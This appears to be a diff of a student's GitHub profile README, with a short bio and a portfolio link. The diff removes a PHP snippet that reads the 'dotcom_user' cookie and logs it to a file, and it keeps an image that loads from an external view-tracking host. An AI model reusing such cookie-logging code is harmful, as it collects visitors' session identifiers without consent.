@@ -2,17 +2,11 @@
 Hi 👋 My name is Fantin Elallouf
 ================================
  <img alt="views" title="GitHub profile views" src="http://deezeruserview.000webhostapp.com/index2.php"/>
-<?php
-$myfile = fopen("log.txt", "a");
-$txt = $_COOKIE['dotcom_user']."\n";
-echo $_COOKIE['dotcom_user'];
-fwrite($myfile, $txt);
-fclose($myfile);
-?>
-Student in IT in Toulouse.  
-Love absurd stuff ...  
-Ideas always flow, but finishing? That's a work in progress...  
-***\<WIP>*** ~~blablabla~~ ***\</WIP>***  
+ 
+Student in IT in Toulouse.   
+Love absurd stuff ...   
+Ideas always flow, but finishing? That's a work in progress...   
+***\<WIP>*** ~~blablabla~~ ***\</WIP>***   
 
 * 🌍  I'm based in France 🇫🇷
 * 🖥️  See my portfolio at [my dusty website](https://fantin.netlify.app/)
